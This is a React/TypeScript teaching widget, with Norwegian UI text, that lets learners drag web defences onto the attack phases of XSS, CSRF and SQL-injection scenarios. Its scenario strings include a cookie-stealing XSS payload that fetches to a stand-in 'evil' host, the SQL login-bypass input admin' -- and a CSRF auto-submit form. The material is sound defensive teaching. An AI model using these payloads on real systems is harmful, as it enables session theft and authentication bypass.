import { useMemo, useState } from "react";
import {
  Search,
  Hammer,
  Send,
  Zap,
  ShieldCheck,
  XCircle,
  CheckCircle2,
  Filter,
  Code as CodeIcon,
  Database,
  Lock,
  Cookie,
  Key,
  Gauge,
} from "lucide-react";

// ---------------------------------------------------------------------------
// AttackVsDefenseTimeline — drag-and-drop kronologi.
//
// Angrepet skjer i fire faser: recon → bygg payload → leveranse → eksekvering.
// Hvert forsvar stopper angrepet på et bestemt steg. Brukeren drar forsvar
// fra paletten ned på riktig fase-rute, og ser med en gang om angrepet blir
// blokkert eller slipper gjennom.
//
// Hver "scenario" (xss, csrf, sqli) har:
//   - 4 faser
//   - et sett forsvar, hver med "stopperAt" som peker på fasen den knekker
// ---------------------------------------------------------------------------

type Phase = "recon" | "build" | "deliver" | "execute";
type ScenarioId = "xss" | "csrf" | "sqli";

type Defense = {
  id: string;
  label: string;
  desc: string;
  icon: typeof ShieldCheck;
  stopsAt: Phase;
};

type Scenario = {
  id: ScenarioId;
  label: string;
  attackerNarrative: Record<Phase, { title: string; text: string }>;
  defenses: Defense[];
};

const PHASE_ORDER: Phase[] = ["recon", "build", "deliver", "execute"];

const PHASE_META: Record<Phase, { label: string; icon: typeof Search; tone: string }> = {
  recon:   { label: "1. Recon",     icon: Search, tone: "text-blue-600 dark:text-blue-400" },
  build:   { label: "2. Bygg",      icon: Hammer, tone: "text-amber-600 dark:text-amber-400" },
  deliver: { label: "3. Leveranse", icon: Send,   tone: "text-purple-600 dark:text-purple-400" },
  execute: { label: "4. Eksekver",  icon: Zap,    tone: "text-destructive" },
};

const SCENARIOS: Scenario[] = [
  {
    id: "xss",
    label: "XSS — stored comment",
    attackerNarrative: {
      recon:   { title: "Sniffer feltet", text: "Angriper skriver test <b>x</b> i kommentar — ser at den vises som bold." },
      build:   { title: "Bygger payload", text: "<script>fetch('//evil/'+document.cookie)</script>" },
      deliver: { title: "Poster kommentar", text: "POST /comments {body: '...payload...'}" },
      execute: { title: "Offer åpner siden", text: "Browser tolker som HTML → fetcher cookie → sender til evil.com" },
    },
    defenses: [
      { id: "input-validate", label: "Input-validering", desc: "Avvis kommentarer som inneholder <script>", icon: Filter, stopsAt: "deliver" },
      { id: "output-escape",  label: "Output-escaping",  desc: "{{ kommentar | escape }} — < blir &lt;",   icon: CodeIcon, stopsAt: "execute" },
      { id: "csp",            label: "Content-Security-Policy", desc: "script-src 'self' — inline scripts blokkeres", icon: ShieldCheck, stopsAt: "execute" },
      { id: "httponly",       label: "HttpOnly cookies", desc: "JS kan ikke lese document.cookie",        icon: Cookie, stopsAt: "execute" },
    ],
  },
  {
    id: "csrf",
    label: "CSRF — auto-submit form",
    attackerNarrative: {
      recon:   { title: "Mapper bankens API",   text: "Angriper ser at POST /transfer tar 'to' og 'amount'." },
      build:   { title: "Bygger angreps-side",  text: "evil.com/cats.html med <form action=bank.com/transfer>" },
      deliver: { title: "Lokker offer",         text: "Lenke i epost — offer klikker, browser auto-submitter form." },
      execute: { title: "Browser POSTer med cookie", text: "Cookie sendes automatisk → server tror brukeren ba om overføring" },
    },
    defenses: [
      { id: "samesite",   label: "SameSite=Lax/Strict cookie", desc: "Cookie sendes ikke ved cross-site POST", icon: Cookie, stopsAt: "execute" },
      { id: "csrf-token", label: "CSRF-token i form",          desc: "Hemmelig token som evil.com ikke kan lese", icon: Key, stopsAt: "execute" },
      { id: "origin-check", label: "Origin/Referer-sjekk",    desc: "Server avviser hvis Origin !== bank.com", icon: Filter, stopsAt: "execute" },
      { id: "rate-limit", label: "Rate-limiting",              desc: "Begrenser skade hvis angrep slipper gjennom", icon: Gauge, stopsAt: "execute" },
    ],
  },
  {
    id: "sqli",
    label: "SQL Injection — login bypass",
    attackerNarrative: {
      recon:   { title: "Tester login-form", text: "Angriper skriver ' i username — får 500-error → vet at SQL er ubeskyttet." },
      build:   { title: "Bygger payload",    text: "admin' --" },
      deliver: { title: "Sender request",    text: "POST /login {username: \"admin' --\", password: \"x\"}" },
      execute: { title: "Server kjører SQL", text: "WHERE username='admin' --' AND password='x' → kommentar slukker password-sjekk → innlogget som admin" },
    },
    defenses: [
      { id: "input-validate", label: "Input-validering",     desc: "Reject ' og -- (skjør — kan bypasses)",         icon: Filter, stopsAt: "deliver" },
      { id: "parameterized", label: "Parameterized query",   desc: "SELECT ... WHERE username = ? — driveren binder data, aldri SQL", icon: Database, stopsAt: "execute" },
      { id: "least-priv",    label: "Least-privilege DB-bruker", desc: "App-brukeren har SELECT/INSERT — ikke DROP/UPDATE all", icon: Lock, stopsAt: "execute" },
      { id: "waf",           label: "WAF / pattern-block",    desc: "Network-layer regex på ' OR '1'='1 (bypassable)", icon: ShieldCheck, stopsAt: "deliver" },
    ],
  },
];

export function AttackVsDefenseTimeline() {
  const [scenarioId, setScenarioId] = useState<ScenarioId>("xss");
  const [placed, setPlaced] = useState<Record<Phase, string[]>>({
    recon: [],
    build: [],
    deliver: [],
    execute: [],
  });
  const [dragId, setDragId] = useState<string | null>(null);

  const scenario = SCENARIOS.find((s) => s.id === scenarioId)!;

  // Hvilken fase blir angrepet stoppet på? Den FØRSTE fasen med et forsvar
  // som "stopsAt" matcher (eller før).
  const stoppedAt = useMemo<Phase | null>(() => {
    for (const phase of PHASE_ORDER) {
      for (const dId of placed[phase]) {
        const def = scenario.defenses.find((d) => d.id === dId);
        if (def && PHASE_ORDER.indexOf(def.stopsAt) >= PHASE_ORDER.indexOf(phase)) {
          // Et forsvar her er korrekt plassert hvis det stopper på sin egen
          // eller en senere fase. Et tidlig forsvar (input-validate i recon)
          // ville ikke gjelde — men her tar vi den tidligste plasseringen
          // som matcher en gyldig stopsAt.
          return phase;
        }
      }
    }
    return null;
  }, [placed, scenario]);

  // Hvilke forsvar er ennå ikke plassert
  const availableDefenses = useMemo(() => {
    const used = new Set(Object.values(placed).flat());
    return scenario.defenses.filter((d) => !used.has(d.id));
  }, [placed, scenario]);

  const onDragStart = (id: string) => setDragId(id);
  const onDragEnd = () => setDragId(null);

  const onDrop = (phase: Phase) => {
    if (!dragId) return;
    setPlaced((p) => ({ ...p, [phase]: [...p[phase], dragId] }));
    setDragId(null);
  };

  const removePlaced = (phase: Phase, id: string) => {
    setPlaced((p) => ({ ...p, [phase]: p[phase].filter((x) => x !== id) }));
  };

  const reset = () => {
    setPlaced({ recon: [], build: [], deliver: [], execute: [] });
    setDragId(null);
  };

  return (
    <div className="rounded-xl border border-border bg-card overflow-hidden">
      {/* Header */}
      <div className="px-5 py-3 border-b border-border bg-muted/20 flex items-center justify-between gap-3 flex-wrap">
        <h3 className="font-semibold">Angrep vs forsvar — kronologisk tidslinje</h3>
        <div className="flex gap-1.5">
          {SCENARIOS.map((s) => (
            <button
              key={s.id}
              onClick={() => {
                setScenarioId(s.id);
                reset();
              }}
              className={`px-3 py-1 rounded text-xs font-medium border transition-colors ${
                scenarioId === s.id
                  ? "bg-foreground text-background border-foreground"
                  : "bg-background border-border hover:bg-muted"
              }`}
            >
              {s.label}
            </button>
          ))}
        </div>
      </div>

      {/* Tidslinje */}
      <div className="p-5">
        <div className="text-xs uppercase tracking-wider text-muted-foreground font-semibold mb-3">
          Tidslinje — dra forsvar inn på fasen hvor det stopper angrepet
        </div>
        <div className="grid sm:grid-cols-4 gap-3">
          {PHASE_ORDER.map((phase) => {
            const meta = PHASE_META[phase];
            const narr = scenario.attackerNarrative[phase];
            const placedHere = placed[phase];
            const wasStopped =
              stoppedAt &&
              PHASE_ORDER.indexOf(phase) === PHASE_ORDER.indexOf(stoppedAt);
            const phaseStarted = !stoppedAt || PHASE_ORDER.indexOf(phase) <= PHASE_ORDER.indexOf(stoppedAt);

            return (
              <div
                key={phase}
                onDragOver={(e) => e.preventDefault()}
                onDrop={() => onDrop(phase)}
                className={`rounded-lg border-2 p-3 transition-colors ${
                  wasStopped
                    ? "border-success bg-success/10"
                    : !phaseStarted
                    ? "border-border bg-muted/20 opacity-50"
                    : "border-destructive/30 bg-destructive/5"
                }`}
              >
                <div className={`flex items-center gap-2 mb-2 ${meta.tone}`}>
                  <meta.icon className="h-4 w-4" />
                  <span className="text-xs font-semibold uppercase tracking-wider">
                    {meta.label}
                  </span>
                </div>
                <div className="text-xs font-medium mb-1 text-foreground">{narr.title}</div>
                <div className="text-[11px] text-muted-foreground mb-3 italic">{narr.text}</div>

                {/* Plasserte forsvar */}
                <div className="space-y-1 min-h-[3rem]">
                  {placedHere.length === 0 ? (
                    <div className="text-[10px] text-muted-foreground/60 italic border border-dashed border-border rounded p-2 text-center">
                      Slipp forsvar her
                    </div>
                  ) : (
                    placedHere.map((dId) => {
                      const def = scenario.defenses.find((d) => d.id === dId)!;
                      const correctPhase = def.stopsAt === phase;
                      return (
                        <button
                          key={dId}
                          onClick={() => removePlaced(phase, dId)}
                          className={`w-full text-left rounded p-1.5 text-[10px] border flex items-start gap-1.5 ${
                            correctPhase
                              ? "bg-success/10 border-success/40 text-success"
                              : "bg-amber-500/10 border-amber-500/40 text-amber-700 dark:text-amber-400"
                          }`}
                        >
                          {correctPhase ? (
                            <CheckCircle2 className="h-3 w-3 mt-0.5 shrink-0" />
                          ) : (
                            <XCircle className="h-3 w-3 mt-0.5 shrink-0" />
                          )}
                          <span>
                            <span className="font-semibold">{def.label}</span>
                            {!correctPhase && (
                              <span className="block opacity-80">
                                Stopper egentlig på "{PHASE_META[def.stopsAt].label}"
                              </span>
                            )}
                          </span>
                        </button>
                      );
                    })
                  )}
                </div>
              </div>
            );
          })}
        </div>

        {/* Outcome */}
        {stoppedAt ? (
          <div className="mt-4 rounded-lg border-2 border-success bg-success/10 p-3 text-sm text-success font-semibold flex items-center gap-2">
            <ShieldCheck className="h-5 w-5" />
            Angrep blokkert på fase "{PHASE_META[stoppedAt].label}"
          </div>
        ) : (
          <div className="mt-4 rounded-lg border-2 border-destructive bg-destructive/10 p-3 text-sm text-destructive font-semibold flex items-center gap-2">
            <Zap className="h-5 w-5" />
            Angrep slapp gjennom alle faser — ofret er kompromittert
          </div>
        )}
      </div>

      {/* Defense-palett */}
      <div className="px-5 py-4 border-t border-border bg-muted/20">
        <div className="flex items-center justify-between mb-2">
          <div className="text-xs uppercase tracking-wider text-muted-foreground font-semibold">
            Forsvars-palett (dra herfra)
          </div>
          <button
            onClick={reset}
            className="text-xs text-brand hover:underline"
          >
            Nullstill plassering
          </button>
        </div>
        <div className="grid sm:grid-cols-2 lg:grid-cols-4 gap-2">
          {availableDefenses.length === 0 ? (
            <div className="text-xs text-muted-foreground italic col-span-full">
              Alle forsvar er plassert.
            </div>
          ) : (
            availableDefenses.map((d) => (
              <div
                key={d.id}
                draggable
                onDragStart={() => onDragStart(d.id)}
                onDragEnd={onDragEnd}
                className="rounded border border-border bg-background p-2.5 cursor-grab active:cursor-grabbing hover:border-brand/50 hover:bg-muted/40"
              >
                <div className="flex items-center gap-1.5 mb-1">
                  <d.icon className="h-3.5 w-3.5 text-brand" />
                  <span className="text-xs font-medium">{d.label}</span>
                </div>
                <div className="text-[10px] text-muted-foreground">{d.desc}</div>
              </div>
            ))
          )}
        </div>
      </div>

      <div className="px-5 py-3 border-t border-border text-xs text-muted-foreground">
        <strong className="text-foreground">Tips:</strong> noen forsvar stopper angrepet FØR
        eksekvering (input-validering, WAF) — de er skjøre fordi de baserer seg på å
        gjenkjenne onde mønstre. De robuste forsvarene (parameterized queries, output-escaping,
        SameSite-cookies) virker AT eksekvering — de fjerner muligheten for at angrepet kan
        kjøre, uavhengig av hva input ser ut som. <em>Defense in depth</em>: bruk begge.
      </div>
    </div>
  );
}
